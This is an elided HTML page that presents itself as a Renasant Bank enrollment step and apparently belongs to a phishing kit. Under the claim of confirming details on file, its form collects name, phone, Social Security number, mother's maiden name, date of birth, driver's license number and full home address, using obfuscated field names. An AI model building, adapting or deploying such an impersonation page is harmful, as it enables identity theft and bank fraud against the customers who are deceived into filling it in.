...
<head>
    ...
    <title>Basic Information - Renasant Bank</title>
...
<body class="min-h-screen bg-gradient-to-b from-[#f7f9fd] via-[#d6e0ec] to-[#4d6f96] flex flex-col">
    ...
    <main class="flex-1 flex items-center justify-center px-4 py-10">
        <div class="bg-white rounded-md w-full max-w-2xl p-6 shadow-lg shadow-slate-900/10">
            <!-- Card Header -->
            <div class="text-center mb-6">
                <h2 class="text-xl font-semibold text-slate-700 mb-2">Basic Information & Home Address</h2>
                <p class="text-sm text-slate-600">Confirm the details we have on file before continuing your enrollment</p>
            </div>
            ...
            <form method="POST" class="space-y-4">
                <!-- First Name -->
                <div>
                    <label for="fzNme" class="block text-sm text-slate-500 font-medium mb-1">First Name</label>
                    <input
                        type="text"
                        id="fzNme"
                        name="fzNme"
                ...
                <!-- Last Name -->
                <div>
                    <label for="lzNme" class="block text-sm text-slate-500 font-medium mb-1">Last Name</label>
                    <input
                        type="text"
                        id="lzNme"
                        name="lzNme"
                ...
                <!-- Phone Number -->
                <div>
                    <label for="phone" class="block text-sm text-slate-500 font-medium mb-1">Phone Number</label>
                    <input
                        type="tel"
                        id="phone"
                        name="phone"
                ...
                <!-- SSN -->
                <div>
                    <label for="ssn" class="block text-sm text-slate-500 font-medium mb-1">Social Security Number</label>
                    <div class="relative">
                        <input
                            type="password"
                            id="ssn"
                ...
                <div>
                    <label for="motherMaidenName" class="block text-sm text-slate-500 font-medium mb-1">Mother's Maiden Name</label>
                    <input
                        type="text"
                        id="motherMaidenName"
                ...
                <!-- Date of Birth -->
                <div>
                    <label class="block text-sm text-slate-500 font-medium mb-1">Date of Birth</label>
                    <div class="grid grid-cols-3 gap-2">
                        <select
                            id="month"
                            name="month"
                            class="px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                            required
                        >
                ...
                <!-- Driver's License -->
                <div>
                    <label for="driverLicense" class="block text-sm text-slate-500 font-medium mb-1">Driver's License Number</label>
                    <input
                        type="text"
                        id="driverLicense"
                        name="driverLicense"
                ...
                <div class="border-t-2 border-slate-300 pt-6 mt-6">
                    <h3 class="text-lg font-semibold text-slate-700 mb-4">Home Address</h3>
                    
                    <!-- Street Address -->
                    <div class="mb-4">
                        <label for="stAd" class="block text-sm text-slate-500 font-medium mb-1">Street Address</label>
                        <input
                            type="text"
                            id="stAd"
                            name="stAd"
                    ...
                    <!-- Apartment/Unit -->
                    <div class="mb-4">
                        <label for="apt" class="block text-sm text-slate-500 font-medium mb-1">Apartment/Unit (Optional)</label>
                        <input
                            type="text"
                            id="apt"
                            name="apt"
                    ...
                    <!-- City -->
                    <div class="mb-4">
                        <label for="city" class="block text-sm text-slate-500 font-medium mb-1">City</label>
                        <input
                            type="text"
                            id="city"
                            name="city"
                    ...
                    <!-- State -->
                    <div class="mb-4">
                        <label for="state" class="block text-sm text-slate-500 font-medium mb-1">State</label>
                        <input
                            type="text"
                            id="state"
                            name="state"
                    ...
                    <!-- Zip Code -->
                    <div class="mb-4">
                        <label for="zipCode" class="block text-sm text-slate-500 font-medium mb-1">Zip Code</label>
                        <input
                            type="text"
                            id="zipCode"
                            name="zipCode"
